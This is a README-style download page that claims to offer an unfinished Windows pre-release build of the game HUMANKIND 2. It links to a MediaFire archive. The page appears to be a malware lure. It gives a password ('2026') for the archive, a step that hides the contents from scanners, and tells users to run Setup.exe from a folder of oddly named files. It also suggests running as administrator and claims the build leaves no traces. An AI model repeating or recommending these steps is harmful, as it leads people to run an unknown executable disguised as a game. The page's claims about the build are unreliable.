<div align="center">

# 🎮 HUMANKIND™ 2

**A raw civilization prototype, still being shaped.**

[![Status](https://img.shields.io/badge/status-pre--release-orange)](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)
[![Download](https://img.shields.io/badge/download-file-00b8ff?logo=googledrive&logoColor=white)](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)
![Platform](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows)

[Download](#-installation--setup) · [Screenshots](#-screenshots) · [System Requirements](#-system-requirements)

</div>

---

## 🕹️ About

HUMANKIND™ 2 is a historical, turn-based strategy game from Amplitude Studios. Guide a civilization from ancient times into the Modern Age by developing cities, expanding an empire, commanding armies, trading with neighbors, and shaping a changing cultural identity. This repository contains an unfinished Windows dev build shared as a raw prototype for testing and feedback.

For strategy players who enjoy long-form historical campaigns, evolving civilizations, and experimental systems in an unfinished development build.

> ⚠️ **This is an early, unfinished pre-release build.** The game is under active development: expect bugs, unfinished content, and balance changes.
>
> 🔒 The archive is password-protected (`2026`) as a standard packaging step to keep the build bundled correctly during distribution. Use the password when extracting.

## ✨ Features

- 🧬 **Cultural Evolution** — Shape customs through ancestral heritage, environment, and historical decisions.
- 🌍 **Changing World** — Adapt your plans as climate and environmental conditions reshape the world.
- ⚔️ **Turn-Based Conflict** — Command armies and respond to rival civilizations across the map.
- 🗺️ **Historical Strategy** — Lead a civilization across eras from ancient times to the Modern Age.
- 🏛️ **Growing Civilizations** — Develop cities, expand territory, and build an evolving empire.
- 🤝 **Diplomatic Choices** — Trade with neighboring civilizations or create new conflicts.

## 📸 Screenshots

<table>
 <tr>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2581850/280fd76006e0282c7d71cc1ba55f5e1e4b26765e/ss_280fd76006e0282c7d71cc1ba55f5e1e4b26765e.1920x1080.jpg?t=1788275034" alt="Screenshot 1" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2581850/339afa2a6a34adb07d8e8906d23dffa97732da16/ss_339afa2a6a34adb07d8e8906d23dffa97732da16.1920x1080.jpg?t=1788275034" alt="Screenshot 2" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2581850/1b9667607e2fcf37afa4d4b1fe997023ae379f58/ss_1b9667607e2fcf37afa4d4b1fe997023ae379f58.1920x1080.jpg?t=1788275034" alt="Screenshot 3" width="100%"></td>
 </tr>
</table>


## 💻 System Requirements

| Component | Minimum | Recommended |
|:--- |:--- |:--- |
| **OS** | Windows 10 (64-bit) | Windows 11 (64-bit) |
| **Processor** | Intel Core i5-8400 or AMD Ryzen 5 2600 | Intel Core i7-10700 or AMD Ryzen 7 3700X |
| **RAM** | 8 GB | 16 GB |
| **Graphics** | NVIDIA GeForce GTX 1060 6 GB or AMD Radeon RX 580 8 GB | NVIDIA GeForce RTX 2060 or AMD Radeon RX 5700 |
| **Storage** | 20 GB available space | 20 GB available space on an SSD |
| **Additional** | DirectX 12, Windows-compatible audio device | DirectX 12, Visual C++ Redistributable 2022 |


## 📦 Installation & Setup

| Platform | Status |
|---|---|
| Windows | ✅ Supported |
| macOS | ❌ Not supported |
| Linux | ❌ Not supported |
### Step 1: Download

You can download the build from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**. The archive contains everything you need to run the game.

### Step 2: Extract with Password

1. The archive is password-protected: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip, etc.)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract **all files** from the archive to a folder of your choice.
2. **IMPORTANT:** All files must be extracted to the **same folder**.
3. Do not rename or move individual files — the build expects its folder structure intact.
4. The folder structure should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- api.pak <- API modules
|-- update_1.res <- Update resources
|-- res.pak <- Resources archive
|-- animations.dll <- Animation system
|-- bootstrap.wem <- Bootstrap audio
|-- launcher.dll <- Launcher library
|-- global.cfg <- Global settings
|-- Password 2026.txt <- Password reminder (empty)
|-- patch_1.bnk <- Audio banks
|-- dlc.md5 <- DLC checksums
|-- installer.dat <- Installer data
|-- driver.umap <- Driver data
|-- lang.sys <- Language system
|-- assets.wem <- Asset audio
|-- update_1.ini <- Update config
|-- scripts.lic <- Game scripts
|-- uninstall.key <- Uninstall key
|-- license.bank <- License data
|-- physics.sys <- Physics engine
|-- settings.bin <- Configuration
|-- license.wem <- Audio assets
|-- audio.res <- Audio resources
|-- localization.ini <- Language files
|-- driver.pak <- Driver archive
```

### Step 4: Launch the Game

1. Navigate to the folder where you extracted all files.
2. Run `Setup.exe`.
3. The game launcher will appear.

### Step 5: Play

1. Click **"Play"** in the launcher window.
2. The game will start with the pre-release build.
3. Enjoy the build — expect bugs, unfinished content, and balance changes.

---

⚠️ **Note:** This is an early, unfinished pre-release build. Some features may be incomplete or broken.

## ❓ Frequently Asked Questions (FAQ)

**Q: What should I do if the game crashes?**
**A:** Crashes are expected in this early stage. Try running the build as administrator, ensure your GPU drivers are up to date, and check the Issues tab for known problems.

**Q: How often is the build updated?**
**A:** Updates are published whenever a new internal snapshot is ready. There is no fixed schedule — the download link in Step 1 always points to the latest available build.

**Q: Why is the archive password-protected?**
**A:** The archive uses a password as a standard packaging step so the build stays bundled correctly during distribution. The password is provided in the installation section above.

**Q: Will this affect my official game install or saves?**
**A:** No. This build is completely self-contained. It does not interact with your existing game files, save data, cloud sync, or platform libraries. It runs independently and leaves no traces behind after deletion.

**Q: What stage is this build at?**
**A:** This is an early development snapshot — a work-in-progress prototype. Large portions of the game may be unfinished, placeholder assets are common, and the final polish, balance, and optimization are not yet in place.

**Q: Does this build require an internet connection?**
**A:** No. The build runs fully offline. No account, launcher, or online check is required to launch it.


---

<div align="center">
If you like this project, consider leaving a ⭐
</div>